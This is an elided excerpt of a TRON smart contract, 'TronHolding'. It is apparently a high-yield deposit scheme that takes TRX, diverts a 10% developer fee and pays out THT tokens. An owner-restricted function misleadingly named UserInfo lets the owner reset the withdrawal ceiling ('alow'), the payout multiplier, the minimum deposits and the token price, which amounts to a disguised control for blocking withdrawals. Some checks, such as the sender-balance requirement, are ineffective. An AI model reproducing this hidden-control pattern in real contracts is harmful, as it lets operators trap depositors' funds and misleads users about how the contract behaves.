...
contract TronHolding {
    ...
    uint private THTminDepositSize = 1000000000;
    ...
    uint public THTperTRXPrice = 2;
    uint public alow = 10000000000000;
    uint public multi = 100;
    ...
    function deposit(address _affAddr) public payable {
        ...
        uint feed1earn = depositAmount.mul(10).div(commissionDivisor);
         developer.transfer(feed1earn);
         THT.transfer(msg.sender, (msg.value * 10 / 100));

    }
    
        function buyTHTtoken (address _affAddr) public payable{
                  
                                require(msg.value >= THTminDepositSize);
                                require(address(msg.sender).balance >= (msg.value));
                                THT.transfer(msg.sender, (msg.value / THTperTRXPrice));
                            }
                            

    function withdraw() public {
        collect(msg.sender);
        require(players[msg.sender].interestProfit < alow );
        require(players[msg.sender].payoutSum  < (players[msg.sender].trxDeposit * multi / 10 ));
    ...
    function reinvest() public {
      ...
      uint feedEarn = depositAmount.mul(10).div(commissionDivisor);
      developer.transfer(feedEarn);
      THT.transfer(msg.sender, (depositAmount * 10 / 100));  
        
    }
    function approveToken(uint256 amount) public project {
    ...
    function getProfit(address _addr) public view returns (uint) {
      ...
      return collectProfit.add(player.interestProfit);
            ...
            function UserInfo(
    uint256 _minDepositSize,
    uint256 _THTminDepositSize,
    uint256 _alow,
    uint256 _THTperTRXPrice,
    uint256 _minuteRate,
    uint256 _multi
    ) public project {
    minDepositSize = _minDepositSize ;
    THTminDepositSize = _THTminDepositSize ;
    alow = _alow ;
    THTperTRXPrice = _THTperTRXPrice ;
